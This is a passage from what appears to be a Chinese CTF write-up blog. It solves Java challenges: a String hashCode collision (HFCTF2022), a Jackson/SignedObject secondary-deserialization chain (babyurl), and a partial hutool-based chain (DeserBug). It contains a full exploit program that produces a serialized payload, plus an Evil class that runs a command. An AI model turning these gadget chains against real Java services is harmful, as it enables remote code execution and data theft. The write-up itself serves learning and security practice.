server.setExecutor(Executors.newCachedThreadPool());<br>        server.start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>第一个问题：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> (String)queryMap.get(<span class="hljs-string">&quot;token&quot;</span>);<br><span class="hljs-keyword">if</span>(Objects.hashCode(token) == <span class="hljs-string">&quot;HFCTF2022&quot;</span>.hashCode() &amp;&amp; !<span class="hljs-string">&quot;HFCTF2022&quot;</span>.equals(token)) &#123;<br>    <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> t.getRequestBody();<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(is).readObject();<br>    &#125;<br></code></pre></td></tr></table></figure><p>哈希碰撞，不过<code>java</code>里这个<code>hashcode</code>这样定义：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> hash;<br>    <span class="hljs-keyword">if</span> (h == <span class="hljs-number">0</span> &amp;&amp; value.length &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-type">char</span> val[] = value;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; value.length; i++) &#123;<br>            h = <span class="hljs-number">31</span> * h + val[i];<br>        &#125;<br>        hash = h;<br>    &#125;<br>    <span class="hljs-keyword">return</span> h;<br>&#125;<br></code></pre></td></tr></table></figure><p>主要就是这个<code>h = 31 * h + val[i];</code>。如果想找个字符串的<code>hashcode</code>和<code>HFCTF2022</code>相等的话：只要最后两位满足：<code>31a+b=31x+y</code>就行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Objects;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">hashcode_colli</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">alphebat</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;A&#x27;</span>; c &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>; c++) &#123;<br>            alphebat += c;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;a&#x27;</span>; c &lt;= <span class="hljs-string">&#x27;z&#x27;</span>; c++) &#123;<br>            alphebat += c;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;0&#x27;</span>; c &lt;= <span class="hljs-string">&#x27;9&#x27;</span>; c++) &#123;<br>            alphebat += c;<br>        &#125;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">secret</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;HFCTF2022&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; alphebat.length(); i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; alphebat.length(); j++) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;HFCTF20&quot;</span>; <br>                token+=alphebat.charAt(i);<br>                token+=alphebat.charAt(j);<br>                <span class="hljs-keyword">if</span> (Objects.hashCode(token) == secret.hashCode() &amp;&amp; !secret.equals(token)) &#123;<br>                    System.out.println(<span class="hljs-string">&quot;SUCCESS&quot;</span>);<br>                    System.out.println(token);<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//HFCTF200p HFCTF201Q</span><br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">global</span>[<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(<span class="hljs-variable language_">global</span>).<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">x</span>=&gt;</span>x.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;eval&#x27;</span>))])<br></code></pre></td></tr></table></figure><h2 id="2023极客巅峰babyurl"><a href="#2023极客巅峰babyurl" class="headerlink" title="2023极客巅峰babyurl"></a>2023极客巅峰babyurl</h2><p><code>java</code>二次反序列化的题，跟着<code>wp</code>写的。主要目的就是学习二次反序列化</p><p>参考文章：</p><p><a href="https://xilitter.github.io/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">1</a></p><p><a href="https://www.xiinnn.com/posts/2023dfjk-babyurl/">2</a></p><p>拿到<code>jar</code>文件直接丢IDEA反编译下，注意下面这几个类：</p><p><code>IndexController.java</code>存在：</p><p><img src="/img/babyurl1.png" alt="babyurl1"></p><p><code>/hack</code>路由接受<code>payload</code>参数，<code>base64</code>解码后反序列化，然后再把反序列化的结果<code>o</code>和它的属性<code>url</code>打印出来。<code>MyObjectInputStream</code>是他自定义的输入流的类：</p><p><img src="/img/babyurl4.png" alt="babyurl4"></p><p><code>String</code>数组是这个：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;java.net.InetAddress&quot;</span>, <span class="hljs-string">&quot;org.apache.commons.collections.Transformer&quot;</span>, <span class="hljs-string">&quot;org.apache.commons.collections.functors&quot;</span>, <span class="hljs-string">&quot;com.yancao.ctf.bean.URLVisiter&quot;</span>, <span class="hljs-string">&quot;com.yancao.ctf.bean.URLHelper&quot;</span>&#125;;<br></code></pre></td></tr></table></figure><p><img src="/img/objectinputstream.png" alt="objectinputstream"></p><p>作用就是在反序列化过程中阻止特定类反序列化。这里看看他后面自己定义那两个：<br><img src="/img/babyurl5.png" alt="babyurl5"></p><p>主要作用就是读取特定<code>URL</code>的内容并返回，但注意<code>ban</code>了<code>file</code>协议。</p><p><img src="/img/babyurl6.png" alt="babyurl6"></p><p>简单说就是通过重写<code>readObject</code>方法把<code>URLvisiter</code>的结果写到<code>tmp/file</code>文件中。</p><p>现在解题思路就很清晰了：通过反序列化特定的<code>URLHelper</code>实例调用其重写的<code>readObject</code>方法达到将特定<code>URL</code>中的内容写到特定文件中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">URLHelper</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLHelper</span>(<span class="hljs-string">&quot;http://127.0.0.1:8888/flag.txt&quot;</span>);<br><span class="hljs-type">URLVisiter</span> <span class="hljs-variable">urlVisiter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLVisiter</span>();<br><span class="hljs-type">Field</span> <span class="hljs-variable">aaa</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.yancao.ctf.bean.URLHelper&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;visiter&quot;</span>);<br>aaa.set(handler,urlVisiter);<br></code></pre></td></tr></table></figure><p>但问题是<code>ban</code>了这两个关键类。。所以要考虑别的方法：二次反序列化</p><p><code>SignedObject</code>类存在<code>getObject</code>方法，里面调用了<code>readObject</code>：</p><p><img src="/img/babyurl9.png" alt="babyurl9"></p><p>而且<code>content</code>完全可控，看它的构造方法，初始化时直接进行了序列化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">SignedObject</span><span class="hljs-params">(Serializable object, PrivateKey signingKey, Signature signingEngine)</span><br>        <span class="hljs-keyword">throws</span> IOException, InvalidKeyException, SignatureException &#123;<br>    <span class="hljs-comment">// 创建一个 ByteArrayOutputStream 对象，它是一个字节数组输出流，用于将对象序列化后的数据写入字节数组</span><br>    <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>    <br>    <span class="hljs-comment">// 创建一个 ObjectOutputStream 对象，并将其连接到 ByteArrayOutputStream 上，用于将对象序列化为字节流</span><br>    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(b);<br><br>    <span class="hljs-comment">// 将传入的对象 object 序列化为字节流，并将其写入到 ByteArrayOutputStream 中</span><br>    a.writeObject(object);<br>    <br>    <span class="hljs-comment">// 刷新 ObjectOutputStream，确保所有数据都被写入到 ByteArrayOutputStream 中</span><br>    a.flush();<br>    <br>    <span class="hljs-comment">// 关闭 ObjectOutputStream，释放资源</span><br>    a.close();<br>    <br>    <span class="hljs-comment">// 将 ByteArrayOutputStream 中的字节数据转换为字节数组，并赋值给 SignedObject 中的 content 属性</span><br>    <span class="hljs-built_in">this</span>.content = b.toByteArray();<br>    <br>    <span class="hljs-comment">// 关闭 ByteArrayOutputStream，释放资源</span><br>    b.close();<br>&#125;<br></code></pre></td></tr></table></figure><p>这里对传入的<code>Object</code>进行了序列化然后传给<code>content</code>，现在可以写一个<code>signedObject</code>类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">KeyPairGenerator keyPairGenerator;<br>keyPairGenerator = KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>keyPairGenerator.initialize(<span class="hljs-number">1024</span>);<br><span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.genKeyPair();<br><span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br><span class="hljs-type">Signature</span> <span class="hljs-variable">signingEngine</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br><span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(恶意类, privateKey, signingEngine);<br><span class="hljs-comment">//用于签名的私钥等其他两个参数不需要深究，当个模板用就可以。</span><br></code></pre></td></tr></table></figure><p>然后调用<code>signedObject</code>的<code>getObject</code>方法就能实现对<code>object</code>这个恶意类的序列化。那么如何触发<code>getObject</code>方法？这里先通过一次序列化触发<code>getObject</code>，然后<code>getObject</code>再触发一次反序列化：</p><p>这里的<code>getter</code>方法要利用<code>Jackson序列化</code>触发：</p><p><a href="https://xz.aliyun.com/t/12509?time__1311=mqmhD50I1GOD/D0lD2DUh98mQ=1Y8eD">参考文章</a></p><p><a href="https://xilitter.github.io/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">参考文章</a></p><p>这里直接照搬这两位师傅的分析：</p><p>在jackson中将对象序列化成一个json串主要是使用的<code>ObjectMapper#writeValueAsString</code>方法</p><p><img src="/img/babyurl10.png" alt="babyurl10"></p><p>然后跟进到_writeValueAndClose里面</p><p><img src="/img/babyurl11.png" alt="babyurl11"></p><p>跟进到这个序列化函数里，后面就类似于封装了，层层调用</p><p><img src="/img/11.png" alt="11"></p><p>然后调用到最终的这个serializeFields方法</p><p><img src="/img/12.png" alt="12"></p><p>这里其实就是通过三元运算符进行<code>getter</code>方法的调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (_accessorMethod == <span class="hljs-literal">null</span>) ? _field.get(bean)<br>: _accessorMethod.invoke(bean, (Object[]) <span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure><p>哪些地方可以调用writeValueAsString方法？</p><p>PojoNode下存在nodeToString方法，调用了这个writeValueAsString：</p><p><img src="/img/13.png" alt="13"></p><p>BaseJsonNode的toString方法调用了这个nodeToString:</p><p><img src="/img/14.png" alt="14"></p><p>这里注意这俩类的关系：这个类是一个抽象类，POJONode就属于它的一个实现类(父与子，我们后面可以通过调用<code>POJONode.toString</code>方法调用它自身的<code>nodeToString</code>方法)</p><p>BadAttributeValueExpException下的eadObject方法调用了toString:</p><p><img src="/img/15.png" alt="15"></p><p>现在可以捋下思路：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs clean">BadAttributeValueExpException#readObject-&gt;<br>POJONode#toString-&gt;<br>ObjectWriter#writeValueAsString-&gt;<br>SignedObject#getObject-&gt;<br>二次反序列化-&gt;<br>URLHelper#readObject-&gt;<br>URLVisiter#visitUrl<br>第一次反序列化为了调用getObject方法，第二次反序列化才是恶意类的反序列化<br></code></pre></td></tr></table></figure><p>然后这里有个坑，<a href="https://boogipop.com/2023/06/20/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80Web%E9%A2%98/">参考文章</a><br>主要就是<code>BaseJsonNode类</code>在反序列化时会走他自定义的一个<code>writeReplace</code>方法：</p><p><img src="/img/16.png" alt="16"></p><p>可以通过反射直接把它删了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>    <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>    <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>    jsonNode.removeMethod(writeReplace);<br>    <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>    jsonNode.toClass(classLoader, <span class="hljs-literal">null</span>);<br>    <span class="hljs-comment">//代码获取当前线程的上下文类加载器。然后，使用toClass方法将修改后的BaseJsonNode类定义加载到JVM中。</span><br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后注意这个<code>toClass</code>方法是<code>javassist</code> 库中的一个方法，得导入相关依赖才能用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;<br>  &lt;groupId&gt;org.javassist&lt;/groupId&gt;<br>  &lt;artifactId&gt;javassist&lt;/artifactId&gt;<br>  &lt;version&gt;<span class="hljs-number">3.25</span><span class="hljs-number">.0</span>-GA&lt;/version&gt;<br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure><p>EXP:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">package</span> com.yancao.ctf;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.yancao.ctf.bean.URLHelper;<br><span class="hljs-keyword">import</span> com.yancao.ctf.bean.URLVisiter;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CtfAttack</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchAlgorithmException, SignatureException, InvalidKeyException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-comment">//恶意类</span><br>        <span class="hljs-type">URLHelper</span> <span class="hljs-variable">urlHelper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLHelper</span>(<span class="hljs-string">&quot;http://127.0.0.1:8888/flag.txt&quot;</span>);<br>        <span class="hljs-comment">//注意这里读文件的URL,也可以这么写：url:file:///flag.txt</span><br>        <span class="hljs-type">URLVisiter</span> <span class="hljs-variable">urlVisiter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLVisiter</span>();<br>        urlHelper.visiter = urlVisiter;<br><br>        <span class="hljs-comment">//用于二次反序列化的类</span><br>        KeyPairGenerator keyPairGenerator;<br>        keyPairGenerator = KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        keyPairGenerator.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.genKeyPair();<br>        <span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br>        <span class="hljs-type">Signature</span> <span class="hljs-variable">signingEngine</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(urlHelper, privateKey, signingEngine);<br><br>        <span class="hljs-comment">//删除 pojoNode 的 writeReplace</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>            jsonNode.removeMethod(writeReplace);<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>            jsonNode.toClass(classLoader, <span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">pojoNode</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(signedObject);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aaa</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> aaa.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(badAttributeValueExpException, pojoNode);<br>        <span class="hljs-comment">//这里设置badAttributeValueExpException对象的val值为pojoNode。反序列化badAttributeValueExpException就会走到pojoNode.ToString</span><br><br>        <span class="hljs-comment">//序列化</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(ser);<br>        objectOutputStream.writeObject(badAttributeValueExpException);<br>        System.out.println(Base64.getEncoder().encodeToString(ser.toByteArray()));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="CISCN-2023-初赛-DeserBug-未完成"><a href="#CISCN-2023-初赛-DeserBug-未完成" class="headerlink" title="[CISCN 2023 初赛]DeserBug(未完成)"></a>[CISCN 2023 初赛]DeserBug(未完成)</h2><p>描述：<code>cn.hutool.json.JSONObject.put-&gt;com.app.Myexpect#getAnyexcept</code></p><p><code>Testapp.java</code>下存在反序列化：</p><p><img src="E:/viper3/myblog/source/_posts/img/deserbug1.png" alt="deserbug1"></p><p>看下<code>pom.xml</code></p><p><img src="E:/viper3/myblog/source/_posts/img/deserbug2.png" alt="deserbug2"></p><p>CC3.2.2版本，CC自3.2.1后新添加了checkUnsafeSerialization功能对反序列化内容进行检测，而CC链常用到的InvokerTransformer就列入了黑名单中，看下给的另一个<code>Myexpect.java</code></p><p><img src="E:/viper3/myblog/source/_posts/img/deserbug3.png" alt="deserbug3"></p><p>结合题目提示能知道利用点在这个<code>getAnyexpect</code>方法，它会<code>new</code>一个实例出来，这里可以想到之前CC3那部分:利用动态类加载机制执行恶意代码，类似这种：</p><p>看下提示中给的<code>cn.hutool.json.JSONObject.put</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Deprecated</span><br><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title function_">put</span><span class="hljs-params">(String key, Object value)</span> <span class="hljs-keyword">throws</span> JSONException &#123;<br>   <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.set(key, value);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里跟下调用栈，即<code>cn.hutool.json.JSONObject.put-&gt;com.app.Myexpect#getAnyexcept</code>，本地调试一下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> cn.hutool.json.JSONObject;<br><span class="hljs-keyword">import</span> com.app.Myexpect;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TmpTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">Myexpect</span> <span class="hljs-variable">myexpect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myexpect</span>();<br><br>        myexpect.setTargetclass(Evil.class);<br><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br><br>        jsonObject.put(<span class="hljs-string">&quot;whatever&quot;</span>, myexpect);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Evil</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="2022-easyjava"><a href="#2022-easyjava" class="headerlink" title="[2022]easyjava"></a>[2022]easyjava</h2><p><a 